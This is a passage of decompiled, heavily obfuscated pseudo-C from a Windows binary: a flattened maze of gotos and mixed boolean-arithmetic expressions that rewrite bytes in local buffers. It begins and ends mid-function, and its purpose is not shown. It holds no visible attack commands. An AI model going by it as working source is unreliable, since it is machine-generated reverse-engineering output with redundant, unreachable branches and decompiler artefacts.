              local_368[uVar16 - 0x60] = bVar21;
              uVar16 = uVar16 + 1;
              goto LAB_140020b23;
            }
            bVar21 = (cVar6 + (cVar6 + 8U & bVar7) * -2 + bVar7) * '\x02' + 0xa0;
LAB_1400213e7:
            local_368[uVar16 - 0x60] =
                 ('*' - (bVar7 & cVar6 - 0xcU)) * '\x02' + bVar7 + (cVar6 - 0xcU);
            uVar23 = uVar23 + 1;
            goto LAB_140020b23;
          }
          bVar21 = bVar7 * '\x02' + (cVar6 - 0x20U & bVar7) * -2 + -0x40 + cVar6;
LAB_140021455:
          local_368[uVar16 - 0x60] =
               ('6' - (bVar7 & cVar6 - 0x34U)) * '\x02' + bVar7 + (cVar6 - 0x34U) + bVar21;
LAB_140021492:
          uVar20 = uVar20 + uVar23;
LAB_140021495:
          uVar16 = uVar16 - bVar21;
          goto LAB_140020b23;
        }
        bVar21 = cVar6 + (cVar6 + 0xb8U & bVar7) * -2 + 0xb0;
      }
      else {
        if (uVar20 == uVar23 + 1) {
          bVar21 = bVar7 + cVar6 + (cVar6 + 0xb8U & bVar7) * -2 + 0xb0;
          uVar16 = uVar16 + (byte)local_368[uVar16 - 0x60] + uVar23 + 1;
          goto LAB_140020b23;
        }
        if (uVar20 != uVar23 + 3) {
          if (uVar20 == uVar23 + 2) {
            bVar21 = bVar7 + cVar6 + (cVar6 + 0x40U & bVar7) * -2 + 0x80;
            goto LAB_140021495;
          }
          if (uVar20 != uVar23 + 5) goto LAB_140020fee;
          cVar6 = ('8' - (cVar6 + 0x18U & bVar7)) * '\x02' + cVar6;
LAB_14002148f:
          bVar21 = cVar6 + bVar7;
          goto LAB_140021492;
        }
        bVar21 = bVar7 + cVar6 + (cVar6 + 0x68U & bVar7) * -2 + 0x90;
      }
LAB_1400214c2:
      bVar11 = bVar7 + (bVar7 & cVar6 + 0xa4U) * -2 + -0x7c + cVar6 + 0xa4U;
      local_368[uVar16 - 0x60] = bVar11;
      uVar16 = uVar16 - ((ulonglong)bVar11 + uVar23 + 1);
      uVar23 = uVar23 + 1;
LAB_1400214e9:
      bVar11 = (char)uVar16 + 0x90;
      local_368[uVar16 - 0x60] = ('\b' - (bVar7 & bVar11)) * '\x02' + bVar7 + bVar11;
      lVar24 = uVar16 + (-1 - (uVar20 + 1));
      uVar16 = lVar24 + (byte)local_368[lVar24 + -0x60] + uVar23 + 1;
      uVar20 = uVar20 + 1;
      goto LAB_140020b23;
    }
    bVar7 = local_408[uVar16 + 0x20];
LAB_14001ffd6:
    if (uVar16 < uVar20) goto LAB_140020ac8;
    cVar6 = (char)uVar16;
    if (uVar23 + 1 <= uVar20) {
      if (uVar20 != uVar23 + 1) {
        if (uVar20 == uVar23 + 2) {
          bVar21 = (bVar7 + cVar6 + 0x93U + (cVar6 + 0x93U & bVar7) * -2) - 5;
          goto LAB_1400209f1;
        }
        if (uVar20 == uVar23 + 3) {
          bVar21 = bVar7 + (cVar6 - 0x19U) + (cVar6 - 0x19U & bVar7) * -2 + 0xaf;
          goto LAB_1400209c0;
        }
        if (uVar20 != uVar23 + 8) goto LAB_140020031;
        cVar22 = bVar7 + (cVar6 + 0x8fU & bVar7) * -2 + -0x5a;
        goto LAB_140020980;
      }
      bVar21 = bVar7 + cVar6 + 0x3fU + (cVar6 + 0x3fU & bVar7) * -2 + 0x47;
      uVar16 = uVar16 + (byte)local_408[uVar16 + 0x20] + uVar23 + 1;
      goto LAB_14001ffc3;
    }
    bVar21 = bVar7 + (bVar7 & cVar6 + 0x15U) * -2 + 'm' + cVar6 + 0x15U;
LAB_140020031:
    if (uVar16 < uVar23) {
      in_stack_00e3ff49 = in_stack_01729634;
      goto LAB_140020ac8;
    }
    if (uVar23 + 3 <= uVar20) {
      if (uVar20 != uVar23 + 1) {
        if (uVar20 == uVar23 + 2) {
          bVar21 = cVar6 + bVar7 + (cVar6 + 0xdU & bVar7) * -2 + 0xb2;
          uVar23 = uVar23 + 1;
        }
        else {
          if (uVar20 != uVar23 + 2) {
            if (uVar20 == uVar23 + 3) {
              cVar22 = bVar7 + (cVar6 + 0x61U & bVar7) * -2 + -0x46;
              goto LAB_1400208f1;
            }
            if (uVar20 != uVar23 + 5) {
              if (uVar20 != uVar23 + 7) goto LAB_1400200b0;
              bVar21 = bVar7 + (cVar6 - 0x21U & bVar7) * -2 + -0x3a + cVar6;
              goto LAB_1400209f1;
            }
            bVar21 = cVar6 + bVar7 + (cVar6 + 0x8bU & bVar7) * -2 + 0xbe;
            goto LAB_1400209c0;
          }
          bVar21 = cVar6 + bVar7 + (cVar6 + 0x37U & bVar7) * -2 + 0xb6;
        }
        goto LAB_14001ffc3;
      }
      cVar22 = bVar7 + (cVar6 - 0x1dU & bVar7) * -2 + -0x52;
      goto LAB_140020980;
    }
    bVar21 = bVar7 + (cVar6 + 0xb9U & bVar7) * -2 + -0x56 + cVar6;
LAB_1400200b0:
    while( true ) {
      uVar17 = uVar23;
      if (uVar23 + uVar20 <= uVar16) break;
      while( true ) {
        do {
          uVar23 = uVar17;
          if (uVar20 == uVar23 + 0x7a) {
            cVar22 = bVar7 + (cVar6 + 6U & bVar7) * -2 + -0x24;
            goto LAB_140020980;
          }
          if (uVar20 == uVar23 + 4) {
            bVar21 = (cVar6 + bVar7 + (cVar6 + 0x30U & bVar7) * -2) - 0x20;
            uVar23 = uVar23 + 1;
            goto LAB_14001ffc3;
          }
          if (uVar20 == uVar23 + 2) {
            bVar21 = (cVar6 + bVar7 + (cVar6 + 0x5aU & bVar7) * -2) - 0x1c;
            goto LAB_14001ffc3;
          }
          if (uVar20 == uVar23 + 10) {
            cVar22 = bVar7 + (cVar6 + 0x84U & bVar7) * -2 + -0x18;
            goto LAB_1400208f1;
          }
          if (uVar20 == uVar23 + 0x80) {
            bVar21 = (cVar6 + bVar7 + (cVar6 + 0xaeU & bVar7) * -2) - 0x14;
            goto LAB_1400209c0;
          }
          if (uVar20 == uVar23 + 0x41) {
            bVar21 = (cVar6 + bVar7 + (cVar6 - 0x28U & bVar7) * -2) - 0x10;
            goto LAB_1400209c3;
          }
          if (uVar20 == uVar23 + 5) {
            bVar21 = bVar7 + (cVar6 + 2U & bVar7) * -2 + -0xc + cVar6;
            goto LAB_1400209f1;
          }
          if (uVar20 == uVar23 + 0x28) {
            bVar21 = bVar7 + (cVar6 + 0x2cU & bVar7) * -2 + -8 + cVar6;
            goto LAB_140020a17;
          }
          if (uVar20 == uVar23 + 0x10) {
            bVar21 = (cVar6 + bVar7 + (cVar6 + 0x56U & bVar7) * -2) - 4;
            uVar16 = uVar16 + (byte)local_408[uVar16 + 0x20] + uVar23 + 1;
            goto LAB_14001ffc3;
          }
          uVar17 = uVar23;
        } while (uVar20 == uVar23 + 0x200);
        uVar20 = uVar23 + 0x2a;
        uVar17 = uVar23 + 0x84;
        if (uVar20 < uVar23 + 0xc5) {
          bVar21 = cVar6 + bVar7 + (cVar6 + 0xbfU & bVar7) * -2 + 0x86;
          goto LAB_14001ffb0;
        }
        if (uVar20 < uVar23 + 0x89) {
          bVar21 = cVar6 + bVar7 + (cVar6 - 0x17U & bVar7) * -2 + 0x8a;
          goto LAB_14001ffc0;
        }
        if (uVar20 < uVar23 + 0xac) {
          bVar21 = bVar7 + (cVar6 + 0x13U & bVar7) * -2 + -0x72 + cVar6;
          uVar23 = uVar17;
          goto LAB_14001ffd6;
        }
        if (uVar20 < uVar23 + 0x484) {
          bVar21 = bVar7 + (cVar6 + 0x3dU & bVar7) * -2 + -0x6e + cVar6;
          uVar23 = uVar17;
          goto LAB_140020031;
        }
        uVar25 = uVar23 + 0x85;
        if (uVar20 < uVar25) break;
        if (uVar20 < uVar23 + 0x8d) {
          cVar22 = bVar7 + (cVar6 + 0x91U & bVar7) * -2 + -0x66;
          uVar23 = uVar17;
          goto LAB_140020491;
        }
        if (uVar20 < uVar23 + 0x8a) {
          cVar22 = bVar7 + (cVar6 + 0xbbU & bVar7) * -2 + -0x62;
          uVar23 = uVar17;
          goto LAB_140020449;
        }
        if (uVar20 < uVar23 + 0xc4) {
          cVar22 = bVar7 + (cVar6 - 0x1bU & bVar7) * -2 + -0x5e;
          uVar23 = uVar17;
          goto LAB_14002040d;
        }
        if (uVar20 < uVar23 + 0x1084) {
          bVar21 = cVar6 + bVar7 + (cVar6 + 0xfU & bVar7) * -2 + 0xa6;
          uVar23 = uVar17;
          goto LAB_1400203ea;
        }
        if (uVar23 + 0x86 <= uVar20) {
          uVar17 = uVar23 + 0x8f;
          uVar20 = uVar25;
          if (uVar23 + 0x98 < uVar25) {
            bVar21 = ('\x18' - (cVar6 + 0x78U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar16 = uVar16 + (byte)local_408[uVar16 + 0x20] + uVar17 + 1;
            uVar23 = uVar17;
            goto LAB_14001ffc3;
          }
          if (uVar23 + 0xf3 < uVar25) {
            bVar21 = ('\x1a' - (cVar6 + 0xa2U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar17;
            goto LAB_140020a17;
          }
          if (uVar23 + 0x109 < uVar25) {
            bVar21 = ('\x1c' - (cVar6 - 0x34U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar17;
            goto LAB_1400209f1;
          }
          if (uVar23 + 0x93 < uVar25) {
            bVar21 = ('\x1e' - (cVar6 - 10U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar17;
            goto LAB_1400209c3;
          }
          if (uVar23 + 0xaf < uVar25) {
            bVar21 = (' ' - (cVar6 + 0x20U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar17;
            goto LAB_1400209c0;
          }
          if (uVar23 + 0x99 < uVar25) {
            cVar22 = ('\"' - (cVar6 + 0x4aU & bVar7)) * '\x02' + bVar7;
            uVar23 = uVar17;
            goto LAB_1400208f1;
          }
          if (uVar23 + 0x10f < uVar25) {
            bVar21 = ('$' - (cVar6 + 0x74U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar17;
            goto LAB_14001ffc3;
          }
          if (uVar23 + 0xd0 < uVar25) {
            bVar21 = ('&' - (cVar6 + 0x9eU & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar23 + 0x90;
            goto LAB_14001ffc3;
          }
          if (uVar23 + 0x94 < uVar25) {
            cVar22 = ('(' - (cVar6 - 0x38U & bVar7)) * '\x02' + bVar7;
            uVar23 = uVar17;
            goto LAB_140020980;
          }
          if (uVar25 <= uVar23 + 0xb7) {
            uVar20 = uVar23 + 0xaf;
            uVar17 = uVar23 + 0x4af;
          }
        }
      }
      bVar21 = bVar7 + (cVar6 + 0x67U & bVar7) * -2 + -0x6a + cVar6;
      uVar23 = uVar17;
    }
    if (uVar20 < uVar23 + 5) {
      cVar22 = bVar7 + (cVar6 + 0x15U & bVar7) * -2 + -0x7e;
LAB_140020491:
      bVar21 = cVar22 + cVar6;
LAB_140020494:
      if (uVar23 + uVar20 == 9) {
        bVar21 = (cVar6 + 0xb2U & bVar7) * -2 + -0x2c + cVar6;
        goto LAB_1400209f1;
      }
      if (uVar20 <= uVar23 + 8) {
        if (uVar20 != uVar23 + 1) {
          if (uVar20 == uVar23 + 2) {
            bVar21 = ('\x01' - (cVar6 + 0x55U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar23 + 1;
            goto LAB_14001ffc3;
          }
          if (uVar20 == uVar23 + 3) {
            bVar21 = ('\a' - (cVar6 - 0x2dU & bVar7)) * '\x02' + bVar7 + cVar6;
            goto LAB_1400209c0;
          }
          if (uVar20 == uVar23 + 5) {
            bVar21 = ('\t' - (cVar6 - 3U & bVar7)) * '\x02' + bVar7 + cVar6;
            goto LAB_1400209c3;
          }
          if (uVar20 == uVar23 + 4) {
            bVar21 = ('\v' - (cVar6 + 0x27U & bVar7)) * '\x02' + bVar7 + cVar6;
            goto LAB_1400209f1;
          }
          if (uVar20 == uVar23 + 6) {
            bVar21 = ('\x0f' - (cVar6 + 0x7bU & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar16 = uVar16 + (byte)local_408[uVar16 + 0x20] + uVar23 + 1;
            goto LAB_14001ffc3;
          }
          goto LAB_14002044c;
        }
        cVar22 = bVar7 + (cVar6 + 0x2bU & bVar7) * -2 + -2;
LAB_140020980:
        bVar21 = cVar22 + cVar6;
LAB_140020983:
        local_408[uVar16 + 0x20] = cVar6 + 0x73U + (cVar6 + 0x73U & bVar7) * -2 + -0x25 + bVar7;
        uVar23 = uVar23 + 1;
        goto LAB_14001ffc3;
      }
      cVar22 = bVar7 + (cVar6 + 1U & bVar7) * -2 + -6;
LAB_140020449:
      bVar21 = cVar22 + cVar6;
LAB_14002044c:
      if (uVar20 < 1000) {
        if (uVar23 + 0x200 < uVar20) {
          cVar22 = bVar7 + (cVar6 + 0xbaU & bVar7) * -2 + -0x5c;
LAB_14002040d:
          bVar21 = cVar22 + cVar6;
        }
        else {
          if (uVar20 == uVar23 + 1) {
            bVar21 = cVar6 + bVar7 + (cVar6 - 0x1cU & bVar7) * -2 + 0xa8;
            uVar16 = uVar16 + (byte)local_408[uVar16 + 0x20] + uVar23 + 1;
            goto LAB_14001ffc3;
          }
          if (uVar20 == uVar23 + 2) {
            bVar21 = bVar7 + (cVar6 + 0x38U & bVar7) * -2 + -0x50 + cVar6;
LAB_1400209f1:
            bVar11 = (cVar6 - 0x39U) + (cVar6 - 0x39U & bVar7) * -2 + -0x71 + bVar7;
            local_408[uVar16 + 0x20] = bVar11;
            uVar16 = uVar16 - ((ulonglong)bVar11 + uVar23 + 1);
            uVar23 = uVar23 + 1;
LAB_140020a17:
            bVar11 = (char)uVar16 - 0x24;
            local_408[uVar16 + 0x20] = bVar11 + (bVar11 & bVar7) * -2 + -4 + bVar7;
            lVar24 = uVar16 + (-1 - (uVar20 + 1));
            uVar16 = lVar24 + (byte)local_408[lVar24 + 0x20] + uVar23 + 1;
            uVar20 = uVar20 + 1;
            goto LAB_14001ffc3;
          }
          if (uVar20 == uVar23 + 3) {
            bVar21 = (cVar6 + bVar7 + (cVar6 + 10U & bVar7) * -2) - 0x3c;
            uVar23 = uVar23 + 1;
            goto LAB_14001ffc3;
          }
          if (uVar20 == uVar23 + 8) {
            cVar22 = bVar7 + (cVar6 + 0x34U & bVar7) * -2 + -0x38;
            goto LAB_140020980;
          }
        }
        if (uVar23 < 0x400) {
LAB_1400203ea:
          local_408[uVar16 + 0x20] = bVar21;
          uVar16 = uVar16 + 1;
          goto LAB_14001ffc3;
        }
        bVar21 = (bVar7 + (cVar6 + 0x5eU & bVar7) * -2 + cVar6) * '\x02' + 0x98;
        goto LAB_140020983;
      }
      cVar22 = bVar7 * '\x02' + (cVar6 + 0x88U & bVar7) * -2 + -0x30;
LAB_1400208f1:
      bVar21 = cVar22 + cVar6;
      local_408[uVar16 + 0x20] =
           bVar21 + (cVar6 + 0x9dU & bVar7) * -2 + -0x4b + cVar6 + 0x9dU + bVar7;
    }
    else {
      if (uVar20 == uVar23 + 1) {
        bVar21 = ('*' - (cVar6 + 0x72U & bVar7)) * '\x02' + bVar7 + cVar6;
        uVar16 = uVar16 + (byte)local_408[uVar16 + 0x20] + uVar23 + 1;
        goto LAB_14001ffc3;
      }
      if (uVar20 == uVar23 + 2) {
        bVar21 = ('.' - (cVar6 - 0x3aU & bVar7)) * '\x02' + bVar7 + cVar6;
        goto LAB_1400209f1;
      }
      if (uVar20 == uVar23 + 3) {
        bVar21 = ('0' - (cVar6 - 0x10U & bVar7)) * '\x02' + bVar7 + cVar6;
        goto LAB_1400209c3;
      }
      if (uVar20 != uVar23 + 4) {
        if (uVar20 == uVar23 + 7) {
          bVar21 = ('6' - (cVar6 + 0x6eU & bVar7)) * '\x02' + bVar7 + cVar6;
          goto LAB_14001ffc3;
        }
        if (uVar20 != uVar23 + 2) goto LAB_140020494;
        cVar22 = (':' - (cVar6 - 0x3eU & bVar7)) * '\x02' + bVar7;
        goto LAB_140020980;
      }
      bVar21 = ('2' - (cVar6 + 0x1aU & bVar7)) * '\x02' + bVar7 + cVar6;
    }
LAB_1400209c0:
    uVar20 = uVar20 + uVar23;
LAB_1400209c3:
    uVar16 = uVar16 - bVar21;
    goto LAB_14001ffc3;
  }
  bVar7 = local_448[uVar25 + 0x20];
LAB_14001f3f6:
  if (uVar25 < uVar23) {
    puVar14 = (undefined4 *)(auStackY_5f8 + 0x9afdc5);
    goto LAB_14001ff09;
  }
  cVar6 = (char)uVar25;
  if (uVar16 + 1 <= uVar23) {
    if (uVar23 != uVar16 + 1) {
      if (uVar23 != uVar16 + 2) {
        if (uVar23 != uVar16 + 2) {
          if (uVar23 != uVar16 + 3) {
            if (uVar23 != uVar16 + 5) {
              if (uVar23 != uVar16 + 8) goto LAB_14001f470;
              bVar21 = cVar6 - 0x35;
              cVar22 = '\x1f';
              goto LAB_14001fd4d;
            }
            bVar21 = cVar6 + 0x27;
            cVar22 = '\v';
            goto LAB_14001fd8c;
          }
          bVar21 = bVar7 + (bVar7 & cVar6 + 0x55U) * -2 + -0x53 + cVar6 + 0x55U;
          goto LAB_14001fdbe;
        }
        bVar21 = cVar6 + 0xb1U + bVar7 + (bVar7 & cVar6 + 0xb1U) * -2 + 0x29;
        goto LAB_14001fdf8;
      }
      bVar21 = bVar7 + (bVar7 & cVar6 - 0x21U) * -2 + -0x19 + (cVar6 - 0x21U);
      goto LAB_14001fe2a;
    }
    bVar21 = cVar6 + 0x3bU + bVar7 + (bVar7 & cVar6 + 0x3bU) * -2 + 99;
    uVar25 = uVar25 + (byte)local_448[uVar25 + 0x20] + uVar16 + 1;
    goto LAB_14001f3e3;
  }
  bVar21 = bVar7 + (bVar7 & cVar6 + 0x69U) * -2 + '!' + cVar6 + 0x69U;
LAB_14001f470:
  if (uVar25 < uVar16) {
    puVar14 = (undefined4 *)(auStackY_5f8 + 0x17fd45c);
    goto LAB_14001ff09;
  }
  if (uVar23 < uVar16 + 0x41) {
    bVar21 = (')' - (cVar6 + 0x9dU & bVar7)) * '\x02' + cVar6 + bVar7;
  }
  else {
    if (uVar23 == uVar16 + 1) {
      bVar21 = cVar6 + 0x6f;
      cVar22 = '3';
      goto LAB_14001fd4d;
    }
    if (uVar23 == uVar16 + 2) {
      bVar21 = cVar6 + (cVar6 + 0x13U & bVar7) * -2 + -0x72 + bVar7;
      goto LAB_14001f3e3;
    }
    if (uVar23 == uVar16 + 2) {
      bVar21 = cVar6 + (cVar6 - 0x1bU & bVar7) * -2 + -0x5e + bVar7;
      goto LAB_14001fdbe;
    }
    if (uVar23 == uVar16 + 5) {
      bVar21 = cVar6 + (cVar6 + 0x89U & bVar7) * -2 + -0x36 + bVar7;
      goto LAB_14001fdf8;
    }
    if (uVar23 == uVar16 + 3) {
      bVar21 = ('\x03' - (cVar6 - 1U & bVar7)) * '\x02' + cVar6 + bVar7;
      uVar25 = uVar25 + (byte)local_448[uVar25 + 0x20] + uVar16 + 1;
      goto LAB_14001f3e3;
    }
  }
  while( true ) {
    uVar17 = uVar16;
    if (uVar16 + uVar23 <= uVar25) break;
    while( true ) {
      do {
        uVar16 = uVar17;
        if (uVar23 == uVar16 + 4) {
          bVar21 = cVar6 + 0x1e;
          cVar22 = '&';
          goto LAB_14001fd4d;
        }
        uVar20 = uVar16 + 9;
        if (uVar23 == uVar20) {
          bVar21 = ('0' - (cVar6 - 0x10U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar16 = uVar16 + 1;
          goto LAB_14001f3e3;
        }
        if (uVar23 == uVar16 + 0x28) {
          bVar21 = cVar6 - 0x3e;
          cVar22 = ':';
          goto LAB_14001fd8c;
        }
        if (uVar23 == uVar16 + 0x80) {
          bVar21 = cVar6 + (cVar6 + 0x94U & bVar7) * -2 + -0x78 + bVar7;
          goto LAB_14001fdbe;
        }
        if (uVar23 == uVar16 + 0x1000) {
          bVar21 = cVar6 + (cVar6 + 0x66U & bVar7) * -2 + -100 + bVar7;
          uVar23 = uVar23 + uVar16;
          goto LAB_14001fdf8;
        }
        if (uVar23 == uVar16 + 0x5a) {
          bVar21 = cVar6 + (cVar6 + 0x38U & bVar7) * -2 + -0x50 + bVar7;
          goto LAB_14001fdf8;
        }
        if (uVar23 == uVar16 + 0x400) {
          bVar21 = cVar6 + (cVar6 + 10U & bVar7) * -2 + -0x3c + bVar7;
          goto LAB_14001fe2a;
        }
        if (uVar23 == uVar16 + 0x41) {
          bVar21 = cVar6 + (cVar6 - 0x24U & bVar7) * -2 + -0x28 + bVar7;
          goto LAB_14001fe53;
        }
        if (uVar23 == uVar16 + 2) {
          bVar21 = cVar6 + (cVar6 + 0xaeU & bVar7) * -2 + -0x14 + bVar7;
          uVar25 = uVar25 + (byte)local_448[uVar25 + 0x20] + uVar16 + 1;
          goto LAB_14001f3e3;
        }
        uVar17 = uVar16;
      } while (uVar23 == uVar16 + 6);
      uVar17 = uVar16 + 0x19;
      if (uVar20 < uVar16 + 0x41) {
        bVar21 = bVar7 + cVar6 + (cVar6 + 0xbbU & bVar7) * -2 + 0x9e;
        goto LAB_14001f3d0;
      }
      uVar19 = uVar16 + 0x21;
      if (uVar20 < uVar19) {
        bVar21 = bVar7 + cVar6 + (cVar6 + 0x8dU & bVar7) * -2 + 0xb2;
        goto LAB_14001f3e0;
      }
      uVar23 = uVar20;
      if (uVar20 < uVar16 + 0x39) {
        bVar21 = cVar6 + (cVar6 + 0x5fU & bVar7) * -2 + -0x3a + bVar7;
        uVar16 = uVar17;
        goto LAB_14001f3f6;
      }
      if (uVar20 < uVar16 + 0x7d) {
        bVar21 = cVar6 + (cVar6 + 0x31U & bVar7) * -2 + -0x26 + bVar7;
        uVar16 = uVar17;
        goto LAB_14001f470;
      }
      if (uVar20 < uVar16 + 0x419) break;
      if (uVar20 < uVar16 + 0x5a) {
        cVar22 = ('\x01' - (cVar6 - 0x2bU & bVar7)) * '\x02' + cVar6;
        uVar16 = uVar17;
        goto LAB_14001f8a7;
      }
      if (uVar20 < uVar16 + 0x1b) {
        cVar22 = ('\v' - (cVar6 + 0xa7U & bVar7)) * '\x02' + cVar6;
        uVar16 = uVar17;
        goto LAB_14001f86c;
      }
      if (uVar20 < uVar16 + 0x93) {
        bVar21 = cVar6 + 0x79;
        cVar22 = '\x15';
        uVar16 = uVar17;
        goto LAB_14001f829;
      }
      if (uVar20 < uVar16 + 0x1a) {
        bVar21 = ('\x1f' - (cVar6 + 0x4bU & bVar7)) * '\x02' + cVar6 + bVar7;
        uVar16 = uVar17;
        goto LAB_14001f80e;
      }
      if (uVar16 + 0x1e <= uVar20) {
        uVar17 = uVar16 + 0x2b;
        uVar23 = uVar19;
        if (uVar16 + 0x4b < uVar19) {
          bVar21 = cVar6 + (cVar6 + 0x58U & bVar7) * -2 + -0x10 + bVar7;
          uVar25 = uVar25 + (byte)local_448[uVar25 + 0x20] + uVar17 + 1;
          uVar16 = uVar17;
          goto LAB_14001f3e3;
        }
        if (uVar16 + 0x8f < uVar19) {
          bVar21 = ('\x02' - (cVar6 + 0x2aU & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar16 = uVar17;
          goto LAB_14001fe53;
        }
        if (uVar16 + 0x42b < uVar19) {
          bVar21 = ('\f' - (cVar6 - 4U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar16 = uVar17;
          goto LAB_14001fe2a;
        }
        if (uVar16 + 0x6d < uVar19) {
          bVar21 = ('\x16' - (cVar6 - 0x32U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar16 = uVar17;
          goto LAB_14001fdf8;
        }
        if (uVar16 + 0x413 < uVar19) {
          bVar21 = (' ' - (cVar6 + 0xa0U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar23 = uVar19 + uVar17;
          uVar16 = uVar17;
          goto LAB_14001fdf8;
        }
        if (uVar16 + 0xa5 < uVar19) {
          bVar21 = ('*' - (cVar6 + 0x72U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar16 = uVar17;
          goto LAB_14001fdbe;
        }
        if (uVar16 + 0x2c < uVar19) {
          bVar21 = cVar6 + 0x44;
          cVar22 = '4';
          uVar16 = uVar17;
          goto LAB_14001fd8c;
        }
        if (uVar16 + 0x30 < uVar19) {
          bVar21 = ('>' - (cVar6 + 0x16U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar16 = uVar16 + 0x2c;
          goto LAB_14001f3e3;
        }
        if (uVar16 + 0x55 < uVar19) {
          cVar22 = cVar6 + (cVar6 - 0x18U & bVar7) * -2 + -0x70;
          uVar16 = uVar17;
          goto LAB_14001fd58;
        }
        if (uVar19 <= uVar16 + 0x2f) {
          uVar23 = uVar16 + 0x31;
          uVar17 = uVar16 + 0x3a;
        }
      }
    }
    bVar21 = cVar6 + (cVar6 + 3U & bVar7) * -2 + -0x12 + bVar7;
    uVar16 = uVar17;
  }
  if (uVar16 + 0x1000 <= uVar23) {
    if (uVar23 == uVar16 + 1) {
      bVar21 = cVar6 + (cVar6 + 0x3aU & bVar7) * -2 + -0x5c + bVar7;
      uVar25 = uVar25 + (byte)local_448[uVar25 + 0x20] + uVar16 + 1;
    }
    else {
      if (uVar23 == uVar16 + 2) {
        bVar21 = cVar6 + (cVar6 + 0xcU & bVar7) * -2 + -0x48 + bVar7;
        goto LAB_14001fe53;
      }
      if (uVar23 == uVar16 + 3) {
        bVar21 = cVar6 + (cVar6 - 0x22U & bVar7) * -2 + -0x34 + bVar7;
        goto LAB_14001fe2a;
      }
      if (uVar23 != uVar16 + 5) {
        if (uVar23 == uVar16 + 4) {
          bVar21 = ('\x04' - (cVar6 + 0x54U & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001fdbe;
        }
        if (uVar23 == uVar16 + 6) {
          bVar21 = cVar6 + 0x26;
          cVar22 = '\x0e';
          goto LAB_14001fd8c;
        }
        if (uVar23 != uVar16 + 2) goto LAB_14001f8aa;
        bVar21 = cVar6 - 0x36;
        cVar22 = '\"';
LAB_14001fd4d:
        cVar22 = (cVar22 - (bVar21 & bVar7)) * '\x02' + cVar6;
        goto LAB_14001fd58;
      }
      bVar21 = cVar6 + (cVar6 + 0x82U & bVar7) * -2 + -0xc + bVar7;
      uVar23 = uVar23 + uVar16;
LAB_14001fdf8:
      uVar25 = uVar25 - bVar21;
    }
    goto LAB_14001f3e3;
  }
  cVar22 = cVar6 + (cVar6 + 0x69U & bVar7) * -2 + -0x76;
LAB_14001f8a7:
  bVar21 = cVar22 + bVar7;
LAB_14001f8aa:
  if (uVar16 + uVar23 == 0x5a) {
    bVar21 = ('\x12' - (cVar6 + 0x7aU & bVar7)) * '\x02' + cVar6;
LAB_14001fe2a:
    bVar11 = bVar7 + (bVar7 & cVar6 - 0x1dU) * -2 + -0x35 + (cVar6 - 0x1dU);
    local_448[uVar25 + 0x20] = bVar11;
    uVar25 = uVar25 - ((ulonglong)bVar11 + uVar16 + 1);
    uVar16 = uVar16 + 1;
LAB_14001fe53:
    bVar11 = (char)uVar25 + 0x4c;
    local_448[uVar25 + 0x20] = bVar7 + (bVar7 & bVar11) * -2 + -0x14 + bVar11;
    lVar24 = uVar25 + (-1 - (uVar23 + 1));
    uVar25 = lVar24 + (byte)local_448[lVar24 + 0x20] + uVar16 + 1;
    uVar23 = uVar23 + 1;
    goto LAB_14001f3e3;
  }
  if (uVar16 + 0x200 < uVar23) {
    cVar22 = cVar6 + (cVar6 + 5U & bVar7) * -2 + -0x1e;
LAB_14001f86c:
    bVar21 = cVar22 + bVar7;
LAB_14001f86f:
    if (0x40 < uVar23) {
      bVar21 = ('\b' - (cVar6 + 0xa8U & bVar7)) * '\x02' + cVar6 + bVar7 * '\x02';
LAB_14001fdbe:
      local_448[uVar25 + 0x20] =
           bVar21 + (bVar7 & cVar6 + 0x11U) * -2 + -0x77 + bVar7 + cVar6 + 0x11U;
      uVar23 = uVar23 + uVar16;
      goto LAB_14001fdf8;
    }
    if (uVar16 + 0x2a < uVar23) {
      bVar21 = cVar6 + 0xa2;
      cVar22 = '\x1a';
LAB_14001f829:
      bVar21 = (cVar22 - (bVar21 & bVar7)) * '\x02' + cVar6 + bVar7;
    }
    else {
      if (uVar23 == uVar16 + 1) {
        bVar21 = ('$' - (cVar6 + 0x74U & bVar7)) * '\x02' + cVar6 + bVar7;
        uVar25 = uVar25 + (byte)local_448[uVar25 + 0x20] + uVar16 + 1;
        goto LAB_14001f3e3;
      }
      if (uVar23 == uVar16 + 3) {
        bVar21 = cVar6 + (cVar6 + 0xbcU & bVar7) * -2 + -0x68 + bVar7;
        uVar23 = uVar23 + uVar16;
        goto LAB_14001fdf8;
      }
      if (uVar23 == uVar16 + 5) {
        bVar21 = cVar6 + (cVar6 + 0x8eU & bVar7) * -2 + -0x54 + bVar7;
        goto LAB_14001fdbe;
      }
      if (uVar23 == uVar16 + 2) {
        cVar22 = cVar6 + (cVar6 + 4U & bVar7) * -2 + -0x18;
        goto LAB_14001fd58;
      }
    }
    if (uVar16 < 0x7a) {
LAB_14001f80e:
      local_448[uVar25 + 0x20] = bVar21;
      uVar25 = uVar25 + 1;
      goto LAB_14001f3e3;
    }
    bVar21 = (cVar6 + (cVar6 - 0x2aU & bVar7) * -2 + bVar7) * '\x02' - 8;
  }
  else {
    if (uVar23 != uVar16 + 1) {
      if (uVar23 == uVar16 + 2) {
        bVar21 = cVar6 + 0x7b;
        cVar22 = '\x0f';
LAB_14001fd8c:
        bVar21 = (cVar22 - (bVar21 & bVar7)) * '\x02' + cVar6 + bVar7;
      }
      else {
        if (uVar23 == uVar16 + 2) {
          bVar21 = ('\x19' - (cVar6 + 0x4dU & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001fdbe;
        }
        if (uVar23 == uVar16 + 3) {
